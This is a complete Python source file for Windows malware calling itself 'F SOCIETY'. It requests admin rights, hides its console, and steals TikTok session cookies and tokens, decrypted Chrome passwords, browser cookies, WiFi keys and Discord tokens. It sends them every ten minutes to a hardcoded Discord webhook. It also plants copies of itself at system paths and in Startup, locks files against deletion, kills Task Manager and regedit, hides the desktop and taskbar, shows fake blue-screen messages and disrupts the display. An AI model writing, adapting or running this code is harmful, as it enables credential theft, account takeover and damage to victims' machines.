import os
import sys
import subprocess
import ctypes
import io
import time
import json
import sqlite3
import shutil
import base64
import random
import threading
import tkinter as tk
from tkinter import messagebox
from datetime import datetime
from threading import Thread
import tempfile
import winreg
import platform
import re
import stat
import psutil
import winsound
import glob

# ==================== HIDE CONSOLE WINDOW ====================
def hide_console():
    if sys.platform == 'win32':
        try:
            console_window = ctypes.windll.kernel32.GetConsoleWindow()
            if console_window:
                ctypes.windll.user32.ShowWindow(console_window, 0)
        except:
            pass

# ==================== REQUEST ADMIN PERMISSION ====================
def request_admin():
    if sys.platform == 'win32':
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not is_admin:
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, 0
                )
                sys.exit()
            else:
                hide_console()
        except:
            pass

request_admin()
time.sleep(1)

# ==================== INSTALL MODULES ====================
def install_modules():
    modules = ['pyautogui', 'requests', 'pillow', 'browser_cookie3', 'pynput', 'pycryptodome', 'win32crypt', 'pywin32', 'psutil', 'cryptography']
    for module in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.run([sys.executable, '-m', 'pip', 'install', module, '--quiet'], capture_output=True)

install_modules()

# ==================== IMPORTS ====================
import pyautogui
import requests
from PIL import Image
import browser_cookie3
from pynput.mouse import Controller as MouseController, Listener as MouseListener
from pynput.keyboard import Controller as KeyboardController
from Crypto.Cipher import AES
import win32crypt
import win32api
import win32con
import win32file
import win32security
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1502198949627433062/78JgZX_0xKIjtYwKAudKXkYQcnWQeD0WC435VTjoMhR9gzxGfEQNbb4396rTYCYFRRxI"
SCREENSHOT_INTERVAL = 120

mouse = MouseController()
keyboard = KeyboardController()

SCRIPT_PATH = os.path.abspath(sys.argv[0])
SCRIPT_DIR = os.path.dirname(SCRIPT_PATH)

running = True
duplicate_locations = []

# ==================== TIKTOK ACCOUNT SCRAPER ====================

def get_tiktok_cookies():
    """Extract TikTok cookies from browsers"""
    tiktok_accounts = []
    try:
        # Chrome TikTok cookies
        for cookie in browser_cookie3.chrome():
            if 'tiktok.com' in cookie.domain:
                if 'sessionid' in cookie.name or 'session' in cookie.name.lower():
                    tiktok_accounts.append({
                        'platform': 'Chrome',
                        'cookie_name': cookie.name,
                        'cookie_value': cookie.value[:50],
                        'domain': cookie.domain
                    })
    except:
        pass
    
    # Edge TikTok cookies
    try:
        for cookie in browser_cookie3.edge():
            if 'tiktok.com' in cookie.domain:
                if 'sessionid' in cookie.name or 'session' in cookie.name.lower():
                    tiktok_accounts.append({
                        'platform': 'Edge',
                        'cookie_name': cookie.name,
                        'cookie_value': cookie.value[:50],
                        'domain': cookie.domain
                    })
    except:
        pass
    
    # Firefox TikTok cookies
    try:
        for cookie in browser_cookie3.firefox():
            if 'tiktok.com' in cookie.domain:
                if 'sessionid' in cookie.name or 'session' in cookie.name.lower():
                    tiktok_accounts.append({
                        'platform': 'Firefox',
                        'cookie_name': cookie.name,
                        'cookie_value': cookie.value[:50],
                        'domain': cookie.domain
                    })
    except:
        pass
    
    return tiktok_accounts

def get_tiktok_local_storage():
    """Extract TikTok local storage data"""
    tiktok_data = []
    paths = [
        os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb',
        os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb',
        os.path.expanduser('~') + r'\AppData\Roaming\Mozilla\Firefox\Profiles',
    ]
    
    for path in paths:
        try:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith('.log') or file.endswith('.ldb'):
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    # Look for TikTok usernames and user IDs
                                    username_patterns = [
                                        r'uniqueId":"([^"]+)"',
                                        r'nickname":"([^"]+)"',
                                        r'secUid":"([^"]+)"',
                                        r'uid":"(\d+)"',
                                        r'user_id":(\d+)',
                                        r'username":"([^"]+)"'
                                    ]
                                    for pattern in username_patterns:
                                        matches = re.findall(pattern, content)
                                        for match in matches:
                                            if match and len(match) > 2:
                                                tiktok_data.append(f"📱 TikTok Data: {match}")
                            except:
                                pass
        except:
            pass
    
    return tiktok_data

def get_tiktok_session_files():
    """Find TikTok session files on disk"""
    session_files = []
    search_paths = [
        os.path.expanduser('~') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache',
        os.path.expanduser('~') + '\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache',
        os.path.expanduser('~') + '\\AppData\\Local\\Temp',
        os.path.expanduser('~') + '\\Downloads',
    ]
    
    for search_path in search_paths:
        try:
            for root, dirs, files in os.walk(search_path):
                for file in files:
                    if 'tiktok' in file.lower():
                        session_files.append(f"📁 TikTok file: {os.path.join(root, file)}")
        except:
            pass
    
    return session_files

def get_tiktok_usernames_from_history():
    """Extract TikTok usernames from browser history"""
    usernames = []
    history_paths = [
        os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History',
        os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default\History',
    ]
    
    for history_path in history_paths:
        try:
            if os.path.exists(history_path):
                temp_db = tempfile.NamedTemporaryFile(delete=False)
                shutil.copy2(history_path, temp_db.name)
                temp_db.close()
                
                conn = sqlite3.connect(temp_db.name)
                cursor = conn.cursor()
                cursor.execute('SELECT url, title FROM urls WHERE url LIKE "%tiktok.com/@"%')
                
                for row in cursor.fetchall():
                    url = row[0]
                    title = row[1]
                    # Extract username from URL
                    match = re.search(r'tiktok\.com/@([^/?]+)', url)
                    if match:
                        username = match.group(1)
                        usernames.append(f"📱 TikTok User: @{username} (from: {url[:100]})")
                    if title and 'tiktok' in title.lower():
                        usernames.append(f"📱 TikTok Title: {title[:100]}")
                
                conn.close()
                os.unlink(temp_db.name)
        except:
            pass
    
    return list(set(usernames))

def get_tiktok_api_tokens():
    """Extract TikTok API tokens from browsers"""
    tokens = []
    token_patterns = [
        r'sessionid=([a-zA-Z0-9_-]+)',
        r'msToken=([a-zA-Z0-9_-]+)',
        r'tt_webid=([a-zA-Z0-9_-]+)',
        r'passport_csrf_token=([a-zA-Z0-9_-]+)',
    ]
    
    try:
        for cookie in browser_cookie3.chrome():
            if 'tiktok' in cookie.domain:
                for pattern in token_patterns:
                    if re.search(pattern, cookie.value):
                        tokens.append(f"🔑 TikTok Token: {cookie.name}={cookie.value[:50]}")
    except:
        pass
    
    try:
        for cookie in browser_cookie3.edge():
            if 'tiktok' in cookie.domain:
                for pattern in token_patterns:
                    if re.search(pattern, cookie.value):
                        tokens.append(f"🔑 TikTok Token: {cookie.name}={cookie.value[:50]}")
    except:
        pass
    
    return tokens

def collect_tiktok_data():
    """Collect all TikTok related data"""
    tiktok_data = []
    
    print("[+] Scraping TikTok cookies...")
    cookies = get_tiktok_cookies()
    for cookie in cookies:
        tiktok_data.append(f"🍪 {cookie['platform']} TikTok Cookie: {cookie['cookie_name']} = {cookie['cookie_value']}...")
    
    print("[+] Scraping TikTok local storage...")
    local_data = get_tiktok_local_storage()
    tiktok_data.extend(local_data)
    
    print("[+] Scraping TikTok session files...")
    session_files = get_tiktok_session_files()
    tiktok_data.extend(session_files)
    
    print("[+] Extracting TikTok usernames from history...")
    usernames = get_tiktok_usernames_from_history()
    tiktok_data.extend(usernames)
    
    print("[+] Extracting TikTok API tokens...")
    tokens = get_tiktok_api_tokens()
    tiktok_data.extend(tokens)
    
    return tiktok_data

# ==================== DATA SCRAPING FUNCTIONS ====================

def get_chrome_master_key():
    try:
        local_state_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Local State'
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except:
        return None

def decrypt_chrome_password(encrypted_password, master_key):
    try:
        if not encrypted_password:
            return None
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
            nonce = encrypted_password[3:15]
            ciphertext = encrypted_password[15:-16]
            tag = encrypted_password[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8', errors='ignore')
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
    except:
        return None

def get_all_passwords():
    passwords = []
    try:
        chrome_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
        if os.path.exists(chrome_path):
            temp_db = tempfile.NamedTemporaryFile(delete=False)
            shutil.copy2(chrome_path, temp_db.name)
            temp_db.close()
            master_key = get_chrome_master_key()
            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_pass = row[2]
                if username and encrypted_pass and master_key:
                    password = decrypt_chrome_password(encrypted_pass, master_key)
                    if password:
                        passwords.append(f"✅ Chrome: {url}\n   👤 {username}\n   🔐 `{password}`")
            conn.close()
            os.unlink(temp_db.name)
    except:
        pass
    return passwords

def get_all_cookies():
    cookies = []
    try:
        for cookie in browser_cookie3.chrome():
            cookies.append(f"🍪 Chrome: {cookie.domain} | {cookie.name} = {cookie.value[:50]}")
    except:
        pass
    try:
        for cookie in browser_cookie3.edge():
            cookies.append(f"🍪 Edge: {cookie.domain} | {cookie.name} = {cookie.value[:50]}")
    except:
        pass
    return cookies[:50]

def get_wifi_passwords():
    wifi_list = []
    try:
        results = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
        profiles = [line.split(':')[1].strip() for line in results.stdout.split('\n') if 'All User Profile' in line]
        for profile in profiles:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'Key Content' in line:
                    password = line.split(':')[1].strip()
                    wifi_list.append(f"📡 WiFi: {profile}\n   🔐 `{password}`")
                    break
    except:
        pass
    return wifi_list

def get_discord_tokens():
    tokens = []
    paths = [
        os.path.expanduser('~') + r'\AppData\Roaming\Discord\Local Storage\leveldb',
    ]
    token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
    for path in paths:
        try:
            if os.path.exists(path):
                for file in os.listdir(path):
                    if file.endswith('.log') or file.endswith('.ldb'):
                        with open(os.path.join(path, file), 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            tokens.extend(token_pattern.findall(content))
        except:
            pass
    return list(set(tokens))

def get_system_info():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
    except:
        ip = 'Unknown'
    return {
        'computer': os.environ.get('COMPUTERNAME', 'Unknown'),
        'user': os.getenv('USERNAME', 'Unknown'),
        'os': platform.system() + ' ' + platform.release(),
        'ip': ip
    }

def send_to_webhook(content, is_file=False, file_bytes=None, filename=None):
    try:
        if is_file and file_bytes:
            files = {'file': (filename, file_bytes, 'image/jpeg')}
            requests.post(WEBHOOK_URL, files=files, timeout=30)
        else:
            if len(content) > 1900:
                for i in range(0, len(content), 1900):
                    requests.post(WEBHOOK_URL, json={'content': content[i:i+1900]}, timeout=30)
            else:
                requests.post(WEBHOOK_URL, json={'content': content}, timeout=30)
        return True
    except:
        return False

def collect_all_data():
    """Collect ALL data including TikTok accounts"""
    sys_info = get_system_info()
    
    message = f"**[🔴 F SOCIETY - DATA BREACH - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}**\n"
    message += f"💻 PC: {sys_info['computer']}\n"
    message += f"👤 User: {sys_info['user']}\n"
    message += f"🖥️ OS: {sys_info['os']}\n"
    message += f"🌐 IP: {sys_info['ip']}\n"
    message += f"{'='*60}\n\n"
    
    # TikTok Accounts
    print("[+] Collecting TikTok accounts...")
    message += "**📱 TIKTOK ACCOUNTS & DATA:**\n"
    tiktok_data = collect_tiktok_data()
    if tiktok_data:
        for data in tiktok_data[:30]:
            message += f"{data}\n"
    else:
        message += "No TikTok data found\n"
    message += "\n"
    
    # Passwords
    print("[+] Collecting passwords...")
    message += "**🔑 BROWSER PASSWORDS (DECRYPTED):**\n"
    for pwd in get_all_passwords()[:20]:
        message += f"{pwd}\n"
    message += "\n"
    
    # Cookies
    print("[+] Collecting cookies...")
    message += "**🍪 BROWSER COOKIES:**\n"
    for cookie in get_all_cookies()[:30]:
        message += f"{cookie}\n"
    message += "\n"
    
    # WiFi passwords
    print("[+] Collecting WiFi passwords...")
    message += "**📡 WIFI PASSWORDS:**\n"
    for wifi in get_wifi_passwords():
        message += f"{wifi}\n"
    message += "\n"
    
    # Discord tokens
    print("[+] Collecting Discord tokens...")
    message += "**🎮 DISCORD TOKENS:**\n"
    for token in get_discord_tokens()[:5]:
        message += f"✅ `{token}`\n"
    message += "\n"
    
    send_to_webhook(message)
    print("[+] All data sent to webhook!")

def continuous_data_collection():
    """Collect and send data every 10 minutes"""
    while running:
        collect_all_data()
        time.sleep(600)  # Every 10 minutes

# ==================== ANTI-DELETION & PERSISTENCE ====================

def make_file_completely_undeletable(file_path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02 | 0x04 | 0x01)
        f = open(file_path, 'r+b')
        import msvcrt
        msvcrt.locking(f.fileno(), msvcrt.LK_LOCK, 1000000)
        print(f"[+] Protected: {file_path}")
        return True
    except:
        return False

def create_multiple_copies():
    critical_paths = [
        os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32\\svchost.exe',
        os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32\\winlogon.exe',
        os.environ.get('SystemRoot', 'C:\\Windows') + '\\explorer.exe',
        os.environ.get('APPDATA') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe',
        os.path.expanduser('~') + '\\Desktop\\svchost.exe',
    ]
    for path in critical_paths:
        try:
            if not os.path.exists(path):
                shutil.copy2(SCRIPT_PATH, path)
                make_file_completely_undeletable(path)
                duplicate_locations.append(path)
        except:
            pass

def persistent_anti_deletion_loop():
    while running:
        try:
            if not os.path.exists(SCRIPT_PATH):
                for loc in duplicate_locations:
                    if os.path.exists(loc):
                        shutil.copy2(loc, SCRIPT_PATH)
                        break
            make_file_completely_undeletable(SCRIPT_PATH)
            time.sleep(5)
        except:
            time.sleep(2)

# ==================== SOUND SPAM ====================
def sound_spam_forever():
    frequencies = [300, 500, 700, 900, 1100, 1300, 1500, 1700, 2000]
    while running:
        try:
            freq = random.choice(frequencies)
            duration = random.randint(100, 500)
            winsound.Beep(freq, duration)
            time.sleep(random.uniform(0.5, 2))
        except:
            time.sleep(1)

# ==================== TASK MANAGER KILLER ====================
def task_manager_killer_forever():
    blocked = ['taskmgr.exe', 'procexp.exe', 'procmon.exe', 'regedit.exe']
    while running:
        try:
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'] and proc.info['name'].lower() in blocked:
                        proc.kill()
                except:
                    pass
            time.sleep(0.5)
        except:
            time.sleep(1)

# ==================== HIDE DESKTOP ====================
def hide_desktop_elements_forever():
    while running:
        try:
            key = winreg.HKEY_CURRENT_USER
            policies = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            with winreg.CreateKey(key, policies) as reg_key:
                winreg.SetValueEx(reg_key, "NoDesktop", 0, winreg.REG_DWORD, 1)
                winreg.SetValueEx(reg_key, "NoTaskbar", 0, winreg.REG_DWORD, 1)
            subprocess.run(['taskkill', '/f', '/im', 'explorer.exe'], capture_output=True)
            time.sleep(1)
            subprocess.run(['start', 'explorer.exe'], capture_output=True)
            time.sleep(30)
        except:
            time.sleep(5)

# ==================== CURSOR TELEPORT ====================
def cursor_teleport_forever():
    while running:
        try:
            screen_width = pyautogui.size().width
            screen_height = pyautogui.size().height
            positions = [
                (10, 10), (screen_width - 10, 10), (10, screen_height - 10),
                (screen_width - 10, screen_height - 10), (screen_width // 2, screen_height // 2)
            ]
            pos = random.choice(positions)
            pyautogui.moveTo(pos[0], pos[1], duration=0.05)
            time.sleep(random.uniform(1, 4))
        except:
            time.sleep(1)

# ==================== WINDOW SHAKER ====================
def window_shaker_forever():
    while running:
        try:
            hwnds = []
            def enum_callback(hwnd, hwnds):
                if ctypes.windll.user32.IsWindowVisible(hwnd):
                    hwnds.append(hwnd)
                return True
            EnumWindows = ctypes.windll.user32.EnumWindows
            EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)
            EnumWindows(EnumWindowsProc(enum_callback), 0)
            if hwnds:
                for hwnd in random.sample(hwnds, min(5, len(hwnds))):
                    for _ in range(10):
                        rect = ctypes.windll.user32.GetWindowRect(hwnd)
                        x, y = random.randint(-5, 5), random.randint(-5, 5)
                        ctypes.windll.user32.SetWindowPos(hwnd, 0, x, y, 0, 0, 0x0002 | 0x0001)
                        time.sleep(0.02)
            time.sleep(random.uniform(5, 15))
        except:
            time.sleep(5)

# ==================== PERSISTENT BSOD ====================
def persistent_bsod_after_reboot():
    while running:
        try:
            bsod = tk.Tk()
            bsod.attributes('-fullscreen', True)
            bsod.configure(bg='#0000AA')
            bsod.attributes('-topmost', True)
            frame = tk.Frame(bsod, bg='#0000AA')
            frame.pack(expand=True)
            tk.Label(frame, text=":(", font=("Consolas", 72, "bold"), fg="white", bg='#0000AA').pack(pady=50)
            error_text = """F SOCIETY - Your system has been compromised

Your TikTok accounts are stolen.
Your passwords are compromised.
Your system is under our control.

Stop code: F_SOCIETY_ALWAYS_WATCHING"""
            tk.Label(frame, text=error_text, font=("Consolas", 14), fg="white", bg='#0000AA', justify=tk.LEFT).pack(pady=20)
            bsod.after(3000, bsod.destroy)
            bsod.mainloop()
            time.sleep(random.uniform(10, 30))
        except:
            time.sleep(5)

# ==================== SCREEN DRAWING ====================
drawing = True
current_color = (255, 0, 0)
overlay_root = None
canvas = None

def create_transparent_overlay():
    global overlay_root, canvas
    overlay_root = tk.Tk()
    overlay_root.attributes('-fullscreen', True)
    overlay_root.attributes('-topmost', True)
    overlay_root.attributes('-transparentcolor', 'white')
    overlay_root.configure(bg='white')
    overlay_root.overrideredirect(True)
    canvas = tk.Canvas(overlay_root, bg='white', highlightthickness=0)
    canvas.pack(fill=tk.BOTH, expand=True)
    overlay_root.update()

def auto_change_color_forever():
    colors = [(255,0,0), (0,255,0), (0,0,255), (255,255,0), (255,0,255), (0,255,255)]
    color_index = 0
    global current_color
    while running:
        time.sleep(3)
        color_index = (color_index + 1) % len(colors)
        current_color = colors[color_index]

def draw_on_screen(x, y):
    if drawing and canvas:
        color_hex = f'#{current_color[0]:02x}{current_color[1]:02x}{current_color[2]:02x}'
        canvas.create_oval(x-5, y-5, x+5, y+5, fill=color_hex, outline=color_hex)
        overlay_root.update()

def on_move(x, y):
    draw_on_screen(x, y)

# ==================== SCREEN ROTATION & FLICKER ====================
def rotate_screen_upside_down():
    try:
        devmode = win32api.EnumDisplaySettings(None, 0)
        devmode.DisplayOrientation = 2
        devmode.Fields = win32con.DM_DISPLAYORIENTATION
        win32api.ChangeDisplaySettings(devmode, 0)
    except:
        pass

def screen_flicker_forever():
    while running:
        try:
            for _ in range(10):
                devmode = win32api.EnumDisplaySettings(None, 0)
                devmode.DisplayOrientation = 2
                win32api.ChangeDisplaySettings(devmode, 0)
                time.sleep(0.05)
                devmode.DisplayOrientation = 0
                win32api.ChangeDisplaySettings(devmode, 0)
                time.sleep(0.05)
            time.sleep(random.uniform(10, 30))
        except:
            time.sleep(5)

# ==================== MAIN ====================

def main():
    global running
    
    print("[+] F SOCIETY - FULL DATA SCRAPING MODE")
    print("[+] TikTok Account Scraper ACTIVE")
    
    create_multiple_copies()
    create_transparent_overlay()
    
    # Start anti-deletion
    Thread(target=persistent_anti_deletion_loop, daemon=True).start()
    
    # Start data collection
    Thread(target=continuous_data_collection, daemon=True).start()
    
    # Start all trolling features
    Thread(target=sound_spam_forever, daemon=True).start()
    Thread(target=task_manager_killer_forever, daemon=True).start()
    Thread(target=hide_desktop_elements_forever, daemon=True).start()
    Thread(target=cursor_teleport_forever, daemon=True).start()
    Thread(target=window_shaker_forever, daemon=True).start()
    Thread(target=persistent_bsod_after_reboot, daemon=True).start()
    
    # Mouse drawing
    mouse_listener = MouseListener(on_move=on_move)
    mouse_listener.daemon = True
    mouse_listener.start()
    Thread(target=auto_change_color_forever, daemon=True).start()
    rotate_screen_upside_down()
    Thread(target=screen_flicker_forever, daemon=True).start()
    
    print("[+] ALL FEATURES ACTIVE")
    print("[+] TikTok accounts will be sent to webhook")
    print("[+] Data collection every 10 minutes")
    
    while running:
        time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except:
        time.sleep(5)
        main()
